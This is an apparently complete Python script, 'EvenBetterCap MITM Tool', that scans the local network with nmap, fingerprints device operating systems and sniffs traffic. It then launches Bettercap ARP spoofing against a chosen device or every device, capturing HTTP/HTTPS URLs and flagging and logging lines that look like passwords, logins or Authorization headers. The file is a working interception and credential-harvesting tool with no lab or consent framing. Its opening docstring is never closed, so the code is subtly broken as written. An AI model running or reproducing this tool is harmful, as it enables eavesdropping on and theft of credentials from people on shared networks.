#!/usr/bin/env python3
"""
Usage:
  sudo python3 TheListener.py

import subprocess
import xml.etree.ElementTree as ET
import re
import sys
import os
import curses
import select
import datetime
import threading
import time
from scapy.all import sniff, IP

# --- MAC Vendor Mapping for quick OS guess (if needed) ---
MAC_OS_MAP = {
    "Apple": "Apple",
    "Samsung": "Android",
    "Huawei": "Android",
    "Xiaomi": "Android",
    "Microsoft": "Windows",
    "Dell": "Windows",
    "HP": "Windows",
    "Intel": "Linux",
    "Cisco": "Cisco",
}

# ---------------------------
# Helper Functions
# ---------------------------
def list_network_interfaces():
    """List available network interfaces (excluding loopback)."""
    try:
        interfaces = os.listdir('/sys/class/net')
        return [iface for iface in interfaces if iface != "lo"]
    except Exception as e:
        print(f"Error listing interfaces: {e}")
        sys.exit(1)

def select_interface():
    """List interfaces and allow user to select one by index."""
    interfaces = list_network_interfaces()
    if not interfaces:
        print("No network interfaces found. Exiting.")
        sys.exit(1)
    print("Available network interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"[{idx}] {iface}")
    try:
        choice = int(input("Select the interface by index: ").strip())
        if choice < 0 or choice >= len(interfaces):
            raise ValueError
    except ValueError:
        print("Invalid selection. Exiting.")
        sys.exit(1)
    return interfaces[choice]

def get_network_info_from_interface(iface):
    """Determine local IP and network range (CIDR) from the chosen interface."""
    try:
        result = subprocess.run(["ip", "-o", "-f", "inet", "addr", "show", iface],
                                  capture_output=True, text=True, check=True)
    except subprocess.CalledProcessError:
        print(f"Error: Unable to obtain IP info for {iface}.")
        sys.exit(1)
    match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
    if match:
        local_ip = match.group(1)
        cidr_suffix = match.group(2)
        cidr = f"{local_ip}/{cidr_suffix}"
        print(f"Detected network range from {iface}: {cidr} (Local IP: {local_ip})")
        return local_ip, cidr
    else:
        print("Error: Could not parse network range from interface details.")
        sys.exit(1)

def scan_network(network_range, local_ip):
    """
    Run a ping scan (nmap -sn -PE) to discover live hosts.
    Excludes the local device.
    Returns a list of device dictionaries with keys: "ip", "mac", "vendor", and "os" (initialized to "waiting").
    """
    print(f"\n[Scan Phase] Running ping scan on {network_range}...")
    scan_file = "ping_scan.xml"
    cmd = ["sudo", "nmap", "-sn", "-PE", "-oX", scan_file, network_range]
    subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if not os.path.exists(scan_file) or os.path.getsize(scan_file) == 0:
        print("Error: No valid ping scan output. Exiting.")
        sys.exit(1)
    devices = []
    try:
        tree = ET.parse(scan_file)
    except ET.ParseError as e:
        print(f"Error: Parsing ping scan XML failed: {e}")
        sys.exit(1)
    root = tree.getroot()
    for host in root.findall('host'):
        if host.find('status').get('state') != "up":
            continue
        dev = {}
        for addr in host.findall('address'):
            addr_type = addr.get('addrtype')
            if addr_type == "ipv4":
                ip = addr.get('addr')
                if ip == local_ip:
                    continue
                dev["ip"] = ip
            elif addr_type == "mac":
                dev["mac"] = addr.get('addr')
                dev["vendor"] = addr.get('vendor', "Unknown")
        if "ip" in dev:
            dev["os"] = "waiting"  # Initialize OS as waiting.
            dev["locked"] = False   # Not locked initially.
            devices.append(dev)
    os.remove(scan_file)
    return devices

def simplify_os(os_str):
    """
    Simplify a verbose OS string to one of: Android, Apple, Linux, Windows, Cisco, or Unknown.
    """
    os_str = os_str.lower()
    if "android" in os_str:
        return "Android"
    elif "apple" in os_str or "ios" in os_str or "mac os" in os_str or "darwin" in os_str:
        return "Apple"
    elif "windows" in os_str:
        return "Windows"
    elif "linux" in os_str:
        return "Linux"
    elif "cisco" in os_str:
        return "Cisco"
    elif "openwrt" in os_str:
        return "OpenWrt"
    else:
        return "Unknown"

# ---------------------------
# Continuous OS Detection Update (Lock When 100% Positive)
# ---------------------------
def update_os_for_device(device, interval, lock):
    """
    Continuously runs a fast OS scan (nmap -O) for the given device.
    Updates the device's OS dynamically.
    Once a scan returns a result with 100% accuracy, the OS value is locked.
    """
    ip = device["ip"]
    while True:
        if device.get("locked"):
            time.sleep(interval)
            continue
        os_scan_file = "temp_os.xml"
        cmd = ["sudo", "nmap", "-O", "--osscan-guess", "--max-os-tries", "1", "-T4", "-oX", os_scan_file, ip]
        try:
            subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
            tree = ET.parse(os_scan_file)
            os_elem = tree.getroot().find('host/os')
            if os_elem is not None:
                os_matches = os_elem.findall('osmatch')
                if os_matches:
                    accuracy = int(os_matches[0].get('accuracy', "0"))
                    new_os = simplify_os(os_matches[0].get('name'))
                else:
                    new_os = "waiting"
                    accuracy = 0
            else:
                new_os = "waiting"
                accuracy = 0
        except Exception:
            new_os = "waiting"
            accuracy = 0
        try:
            if os.path.exists(os_scan_file):
                os.remove(os_scan_file)
        except FileNotFoundError:
            pass
        with lock:
            device["os"] = f"{new_os} (Nmap, {accuracy}%)" if new_os != "waiting" else "waiting"
            if new_os != "waiting" and accuracy == 100:
                device["locked"] = True
        time.sleep(interval)

def concurrent_os_update(devices, interval):
    """Spawn a thread for each device to update OS info concurrently."""
    lock = threading.Lock()
    threads = []
    for device in devices:
        t = threading.Thread(target=update_os_for_device, args=(device, interval, lock))
        t.daemon = True
        t.start()
        threads.append(t)
    return threads

# ---------------------------
# Live Traffic Monitoring (Airodump-ng Style) with Credential Extraction
# ---------------------------
def monitor_and_select_target(devices, iface):
    """
    Uses Scapy to monitor live IP traffic on the given interface.
    Displays an updating table with columns:
      Index | IP Address | OS | Vendor | Packets | Bytes | Flags
    The table is aligned using fixed column widths.
    Flags [CRED] if packet count exceeds a threshold.
    Press 's' to stop monitoring and select a target.
    Returns the selected device's IP.
    """
    stats = {device["ip"]: {"packets": 0, "bytes": 0} for device in devices}
    stats_lock = threading.Lock()
    os_lock = threading.Lock()

    def packet_handler(packet):
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            length = len(packet)
            with stats_lock:
                if src in stats:
                    stats[src]["packets"] += 1
                    stats[src]["bytes"] += length
                if dst in stats:
                    stats[dst]["packets"] += 1
                    stats[dst]["bytes"] += length
            # Passive OS detection using TTL:
            if packet.haslayer(IP):
                ttl = packet[IP].ttl
                if ttl <= 64:
                    guess = "Linux"
                elif ttl <= 128:
                    guess = "Windows"
                else:
                    guess = "Cisco"
                with os_lock:
                    for device in devices:
                        if device["ip"] == src and device["os"] == "waiting":
                            device["os"] = guess + " (Passive)"
    
    sniffer_thread = threading.Thread(target=lambda: sniff(iface=iface, filter="ip", prn=packet_handler, store=0))
    sniffer_thread.daemon = True
    sniffer_thread.start()

    # Spawn OS update threads concurrently.
    concurrent_os_update(devices, 60)

    def curses_traffic_ui(stdscr):
        curses.curs_set(0)
        stdscr.nodelay(True)
        stdscr.clear()
        # Fixed column widths.
        col_idx = 5
        col_ip = 18
        col_os = 12
        col_vendor = 20
        col_pkts = 10
        col_bytes = 10
        header = (f"{'Idx':<{col_idx}} {'IP Address':<{col_ip}} {'OS':<{col_os}} "
                  f"{'Vendor':<{col_vendor}} {'Packets':<{col_pkts}} {'Bytes':<{col_bytes}} {'Flags':<8}")
        header_full = "Live Traffic Monitor - Press 's' to stop and select a target"
        while True:
            stdscr.erase()
            stdscr.addstr(0, 2, header_full, curses.A_BOLD)
            stdscr.addstr(1, 2, header, curses.A_UNDERLINE)
            stdscr.hline(2, 0, curses.ACS_HLINE, curses.COLS)
            row = 3
            with stats_lock, os_lock:
                for idx, device in enumerate(devices):
                    ip = device["ip"]
                    os_info = simplify_os(device.get("os", "waiting"))
                    vendor = device.get("vendor", "Unknown")
                    pkt = stats[ip]["packets"]
                    byt = stats[ip]["bytes"]
                    flag = "[CRED]" if pkt > 1000 else ""
                    line = (f"{str(idx):<{col_idx}} {ip:<{col_ip}} {os_info:<{col_os}} "
                            f"{vendor:<{col_vendor}} {str(pkt):<{col_pkts}} {str(byt):<{col_bytes}} {flag:<8}")
                    stdscr.addstr(row, 2, line)
                    row += 1
            stdscr.addstr(row + 1, 2, "Press 's' to stop monitoring and select a target.")
            stdscr.refresh()
            ch = stdscr.getch()
            if ch == ord('s'):
                break
            curses.napms(200)
    
    curses.wrapper(curses_traffic_ui)

    print("\nFinal Traffic Statistics:")
    with stats_lock, os_lock:
        for idx, device in enumerate(devices):
            ip = device["ip"]
            os_info = simplify_os(device.get("os", "waiting"))
            vendor = device.get("vendor", "Unknown")
            pkt = stats[ip]["packets"]
            byt = stats[ip]["bytes"]
            print(f"[{idx}] IP: {ip} | OS: {os_info} | Vendor: {vendor} | Packets: {pkt} | Bytes: {byt}")
    try:
        choice = int(input("Enter the index of the target device: ").strip())
        if choice < 0 or choice >= len(devices):
            raise ValueError
    except ValueError:
        print("Invalid selection. Exiting.")
        sys.exit(1)
    return devices[choice]["ip"]

# ---------------------------
# Bettercap MITM Attack and Live Output UI with Credential Highlighting
# ---------------------------
def clean_output(line):
    """
    Cleans Bettercap output to extract URLs or SNI info.
    Also flags lines containing potential credential patterns.
    """
    # Use a standard ANSI escape removal regex.
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    line = ansi_escape.sub('', line)
    cleaned = ""
    match = re.search(r'SNI:\s*(\S+)', line, re.IGNORECASE)
    if match:
        cleaned = f"HTTPS SNI: {match.group(1)}"
    else:
        urls = re.findall(r'(https?://\S+)', line, re.IGNORECASE)
        if urls:
            cleaned = " | ".join(urls)
    cred_patterns = [r'password=', r'user=', r'login=', r'Authorization:']
    for pattern in cred_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            cleaned += " [CRED]"
            break
    return cleaned

def get_log_timestamp():
    """Return current timestamp as [YYYY-MM-DD HH:MM:SS]."""
    return datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")

def curses_loop(stdscr, proc, log_file):
    """
    Displays live Bettercap output in a curses dashboard.
    Each log entry is timestamped.
    Consecutive duplicate lines (with the same timestamp to the second) are suppressed.
    Logs output to the provided file.
    Press 'q' to exit.
    """
    curses.curs_set(0)
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_CYAN, -1)
    curses.init_pair(2, curses.COLOR_GREEN, -1)
    curses.init_pair(3, curses.COLOR_MAGENTA, -1)
    stdscr.nodelay(True)
    output_lines = []
    header_text = "EvenBetterCap MITM Tool - Live Bettercap Output"
    subheader_text = "Press 'q' to exit"
    while True:
        try:
            ready, _, _ = select.select([proc.stdout], [], [], 0.1)
            if proc.stdout in ready:
                line = proc.stdout.readline()
                if line:
                    text = clean_output(line)
                    if text:
                        timestamp = get_log_timestamp()
                        full_text = timestamp + " " + text
                        # Only add if the timestamp portion (to the second) differs from the previous.
                        current_ts = full_text[:21]
                        if not output_lines or output_lines[-1][:21] != current_ts or full_text != output_lines[-1]:
                            output_lines.append(full_text)
                            log_file.write(full_text + "\n")
                            log_file.flush()
                            max_lines = curses.LINES - 5
                            if len(output_lines) > max_lines:
                                output_lines = output_lines[-max_lines:]
            key = stdscr.getch()
            if key == ord('q'):
                break
            stdscr.erase()
            stdscr.attron(curses.color_pair(1))
            stdscr.addstr(0, 2, header_text)
            stdscr.addstr(1, 2, subheader_text)
            stdscr.attroff(curses.color_pair(1))
            stdscr.hline(2, 0, curses.ACS_HLINE, curses.COLS)
            y = 3
            for line in output_lines:
                if y < curses.LINES - 2:
                    stdscr.attron(curses.color_pair(2))
                    stdscr.addstr(y, 2, line)
                    stdscr.attroff(curses.color_pair(2))
                    y += 1
            footer_text = "Press 'q' to exit | Bettercap MITM Live Log"
            stdscr.attron(curses.color_pair(3))
            stdscr.addstr(curses.LINES - 1, 2, footer_text)
            stdscr.attroff(curses.color_pair(3))
            stdscr.refresh()
        except KeyboardInterrupt:
            break
    proc.terminate()

def run_bettercap_dynamic(target_ip, iface):
    """
    Launches Bettercap to perform an ARP spoof MITM attack on the target device.
    If target_ip is "all", Bettercap is launched in global mode.
    Live output is displayed in a curses UI and logged to a file.
    The log file name is based on the current date/time in the format "DD_MM_YY_HHMM".
    """
    if target_ip.lower() == "all":
        print(f"\nStarting Bettercap MITM attack on all devices via interface {iface}...")
        bc_eval = (
            "arp.spoof on; "
            "set net.sniff.filter \"tcp port 80 or tcp port 443\"; "
            "net.sniff on;"
        )
    else:
        print(f"\nStarting Bettercap MITM attack on {target_ip} via interface {iface}...")
        bc_eval = (
            f"set arp.spoof.targets {target_ip}; "
            "arp.spoof on; "
            "set net.sniff.filter \"tcp port 80 or tcp port 443\"; "
            "net.sniff on;"
        )
    print("Switch to the terminal window for live output. Press 'q' to exit.")
    logs_folder = "logs"
    os.makedirs(logs_folder, exist_ok=True)
    log_filename = os.path.join(logs_folder, f"bettercap_log_{datetime.datetime.now().strftime('%d_%m_%y_%H%M')}.txt")
    log_file = open(log_filename, "w")
    print(f"Logging output to {log_filename}")
    command = ["sudo", "bettercap", "-iface", iface, "-eval", bc_eval]
    print("Executing command:")
    print(" ".join(command))
    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        curses.wrapper(curses_loop, proc, log_file)
    except Exception as e:
        print(f"Error in live output: {e}")
        proc.terminate()
        sys.exit(1)
    finally:
        log_file.close()

# ---------------------------
# Main Execution Flow
# ---------------------------
def main():
    print("=== EvenBetterCap MITM Tool ===")
    iface = select_interface()
    local_ip, network_range = get_network_info_from_interface(iface)
    devices = scan_network(network_range, local_ip)
    if not devices:
        print("No devices found on the network. Exiting.")
        sys.exit(1)
    print("\nDiscovered Devices:")
    for idx, device in enumerate(devices):
        ip = device.get("ip", "Unknown")
        mac = device.get("mac", "Unknown")
        vendor = device.get("vendor", "Unknown")
        print(f"[{idx}] IP: {ip} | MAC: {mac} | Vendor: {vendor}")
    # Prompt user for mode: select a single device or listen to all.
    option = input("\nEnter 's' to select a single device or 'a' to listen to all devices: ").lower()
    if option == "a":
        target_ip = "all"
    else:
        print("\nMonitoring live traffic and updating OS information...")
        target_ip = monitor_and_select_target(devices, iface)
    print(f"\nSelected target: {target_ip}")
    run_bettercap_dynamic(target_ip, iface)

if __name__ == "__main__":
    main()
